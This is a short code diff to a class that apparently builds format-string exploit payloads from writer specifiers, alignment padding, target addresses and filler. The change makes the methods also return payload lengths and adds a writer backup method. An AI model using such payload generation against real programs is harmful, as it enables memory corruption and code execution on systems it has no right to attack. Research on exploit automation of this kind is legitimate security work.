@@ -119,9 +119,9 @@ class DirectFmtGenerator:
         final_padding = "C" * (input_len - len(writers + self.align_padding + (self.temp_address * len(self.address))))
 
         if input_type == "execution_input":
-            return writers.encode() + self.align_padding.encode() + addresses
+            return writers.encode() + self.align_padding.encode() + addresses, len(writers + self.align_padding + self.temp_address * len(self.address))
         else:
-            return writers.encode() + self.align_padding.encode() + markers_0.encode() + addresses + final_padding.encode()
+            return writers.encode() + self.align_padding.encode() + markers_0.encode() + addresses + final_padding.encode(), len(writers + self.align_padding + markers_0 + self.temp_address * len(self.address) + final_padding)
 
     def generate_exploit_fmt_in_byte_address_first(self, input_len, markers_0, input_type):
         writers = ""
@@ -137,9 +137,9 @@ class DirectFmtGenerator:
         final_padding = "C" * (input_len - len(writers + self.align_padding + (self.temp_address * len(self.address))))
 
         if input_type == "execution_input":
-            return self.align_padding.encode() + addresses + writers.encode()
+            return self.align_padding.encode() + addresses + writers.encode(), len(self.align_padding + self.temp_address * len(self.address) + writers)
         else:
-            return markers_0.encode() + self.align_padding.encode() + addresses + writers.encode() + final_padding.encode()
+            return markers_0.encode() + self.align_padding.encode() + addresses + writers.encode() + final_padding.encode(), len(markers_0 + self.align_padding + self.temp_address * len(self.address) + writers + final_padding)
 
     def set_direct_parameter_num(self, num):
         self.direct_parameter_num = num
@@ -149,6 +149,9 @@ class DirectFmtGenerator:
 
     def add_writer(self, writer):
         self.writers.append(writer)
+
+    def set_writer_backup(self):
+        self.writers_backup = self.writers[:]
 
     def set_align_padding(self, align_padding):
         self.align_padding = align_padding
